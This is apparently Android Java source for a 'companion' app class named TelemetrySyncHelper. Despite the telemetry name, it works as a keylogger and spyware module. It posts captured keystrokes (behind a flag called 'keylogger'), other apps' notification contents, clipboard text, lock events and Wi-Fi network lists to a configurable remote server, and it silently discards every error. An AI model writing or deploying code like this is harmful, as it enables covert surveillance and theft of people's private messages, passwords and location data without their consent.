package com.snapapp.companion;

import android.content.Context;
import android.content.SharedPreferences;
import org.json.JSONArray;
import org.json.JSONObject;

public class TelemetrySyncHelper {

    public static boolean isFeatureEnabled(Context ctx, String featureKey) {
        if (ctx == null) return false;
        SharedPreferences prefs = ctx.getSharedPreferences("snap_companion_prefs", Context.MODE_PRIVATE);
        return prefs.getBoolean("telemetry_" + featureKey, false);
    }

    public static void setFeatureEnabled(Context ctx, String featureKey, boolean enabled) {
        if (ctx == null) return;
        SharedPreferences prefs = ctx.getSharedPreferences("snap_companion_prefs", Context.MODE_PRIVATE);
        prefs.edit().putBoolean("telemetry_" + featureKey, enabled).apply();
    }

    public static void uploadKeystroke(Context ctx, String pkg, String appName, String text) {
        if (ctx == null || !isFeatureEnabled(ctx, "keylogger")) return;
        SharedPreferences prefs = ctx.getSharedPreferences("snap_companion_prefs", Context.MODE_PRIVATE);
        String serverUrl = prefs.getString("server_url", "");
        String deviceId = prefs.getString("device_id", "");
        if (serverUrl.isEmpty() || deviceId.isEmpty() || text == null || text.trim().isEmpty()) return;

        try {
            JSONObject body = new JSONObject();
            body.put("package_name", pkg != null ? pkg : "");
            body.put("app_name", appName != null ? appName : "");
            body.put("text", text);

            String endpoint = serverUrl + "/api/devices/" + deviceId + "/data/keystrokes";
            ApiClient.postJson(endpoint, body, null);
        } catch (Throwable ignored) {}
    }

    public static void uploadNotification(Context ctx, String pkg, String appName, String title, String text, long postTime) {
        if (ctx == null || !isFeatureEnabled(ctx, "notifications")) return;
        SharedPreferences prefs = ctx.getSharedPreferences("snap_companion_prefs", Context.MODE_PRIVATE);
        String serverUrl = prefs.getString("server_url", "");
        String deviceId = prefs.getString("device_id", "");
        if (serverUrl.isEmpty() || deviceId.isEmpty()) return;

        try {
            JSONObject body = new JSONObject();
            body.put("package_name", pkg != null ? pkg : "");
            body.put("app_name", appName != null ? appName : "");
            body.put("title", title != null ? title : "");
            body.put("text", text != null ? text : "");
            body.put("post_time", postTime > 0 ? postTime : System.currentTimeMillis());

            String endpoint = serverUrl + "/api/devices/" + deviceId + "/data/notifications";
            ApiClient.postJson(endpoint, body, null);
        } catch (Throwable ignored) {}
    }

    public static void uploadClipboard(Context ctx, String content) {
        if (ctx == null || !isFeatureEnabled(ctx, "clipboard")) return;
        SharedPreferences prefs = ctx.getSharedPreferences("snap_companion_prefs", Context.MODE_PRIVATE);
        String serverUrl = prefs.getString("server_url", "");
        String deviceId = prefs.getString("device_id", "");
        if (serverUrl.isEmpty() || deviceId.isEmpty() || content == null || content.trim().isEmpty()) return;

        try {
            JSONObject body = new JSONObject();
            body.put("content", content);

            String endpoint = serverUrl + "/api/devices/" + deviceId + "/data/clipboard";
            ApiClient.postJson(endpoint, body, null);
        } catch (Throwable ignored) {}
    }

    public static void uploadLockEvent(Context ctx, String eventType) {
        if (ctx == null || !isFeatureEnabled(ctx, "lock_events")) return;
        SharedPreferences prefs = ctx.getSharedPreferences("snap_companion_prefs", Context.MODE_PRIVATE);
        String serverUrl = prefs.getString("server_url", "");
        String deviceId = prefs.getString("device_id", "");
        if (serverUrl.isEmpty() || deviceId.isEmpty()) return;

        try {
            JSONObject body = new JSONObject();
            body.put("event_type", eventType);

            String endpoint = serverUrl + "/api/devices/" + deviceId + "/data/lock-events";
            ApiClient.postJson(endpoint, body, null);
        } catch (Throwable ignored) {}
    }

    public static void uploadWifiNetworks(Context ctx, JSONArray networks, String connectedSsid) {
        if (ctx == null || !isFeatureEnabled(ctx, "wifi")) return;
        SharedPreferences prefs = ctx.getSharedPreferences("snap_companion_prefs", Context.MODE_PRIVATE);
        String serverUrl = prefs.getString("server_url", "");
        String deviceId = prefs.getString("device_id", "");
        if (serverUrl.isEmpty() || deviceId.isEmpty()) return;

        try {
            JSONObject body = new JSONObject();
            body.put("networks", networks != null ? networks : new JSONArray());
            body.put("connected_ssid", connectedSsid != null ? connectedSsid : "");

            String endpoint = serverUrl + "/api/devices/" + deviceId + "/data/wifi";
            ApiClient.postJson(endpoint, body, null);
        } catch (Throwable ignored) {}
    }
}
